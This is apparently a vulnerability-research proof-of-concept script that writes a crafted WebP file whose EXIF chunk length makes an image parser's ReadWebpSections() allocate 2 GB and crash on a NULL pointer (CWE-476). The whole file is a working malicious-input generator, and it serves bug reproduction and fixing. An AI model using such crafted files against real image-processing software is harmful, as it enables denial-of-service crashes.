#!/usr/bin/env python3
"""
VULN 001 PoC generator: NULL Pointer Dereference via Unchecked malloc in WebP Chunk Reading
CWE-476

Trigger: ReadWebpSections() reads a chunk length of 0x7FFFFFFF.
  ReadLen = (0x7FFFFFFF + 1) & ~1 = 0x80000000  (2 GB)
  malloc(0x80000000) returns NULL (forced via ASAN max_allocation_size_mb=512)
  fread(NULL, 1, ReadLen, infile) -> SIGSEGV when glibc tries to memcpy
  real data into NULL.

NOTE: The file must contain at least a few bytes of chunk data AFTER the
chunk header so that glibc's fread() actually tries to write into the
(NULL) buffer rather than returning 0 on immediate EOF.
"""
import struct
import os

OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_001_input.jpg")

# Malicious chunk: FourCC "EXIF", length = 0x7FFFFFFF
# The guard: if ((int)ChunkLen <= 0) continue;
#   (int)0x7FFFFFFF = 2147483647 > 0 => passes.
# ReadLen = (0x7FFFFFFF + 1) & ~1 = 0x80000000 = 2 GB
# With ASAN max_allocation_size_mb=512, malloc(2GB) returns NULL.
# fread(NULL, 1, 2GB, infile) attempts a memcpy to NULL => SIGSEGV.
chunk_fourcc = b"EXIF"
chunk_len = 0x7FFFFFFF

# Include a small pad of real bytes after the chunk header.
# This ensures the file is NOT at EOF when fread(NULL,...) is called,
# so glibc's fread will attempt to copy data into the NULL pointer and crash.
chunk_data_pad = b"\xde\xad\xbe\xef" * 8  # 32 bytes of padding

# Build the chunk: 4-byte FourCC + 4-byte LE length + padding data
chunk_header = chunk_fourcc + struct.pack("<I", chunk_len)

# RIFF payload: "WEBP" + chunk header + padding
riff_payload = b"WEBP" + chunk_header + chunk_data_pad
riff_header = b"RIFF" + struct.pack("<I", len(riff_payload)) + b""

# Full file
payload = b"RIFF" + struct.pack("<I", len(riff_payload)) + riff_payload

with open(OUT, "wb") as f:
    f.write(payload)

print(f"[+] Written {len(payload)} bytes to {OUT}")
print(f"[+] Chunk '{chunk_fourcc.decode()}' length field = 0x{chunk_len:08X}")
print(f"[+] Padding bytes after header: {len(chunk_data_pad)} (so fread sees data to read)")
print(f"[+] Expected: malloc(0x80000000) returns NULL -> fread(NULL,...) -> SIGSEGV")
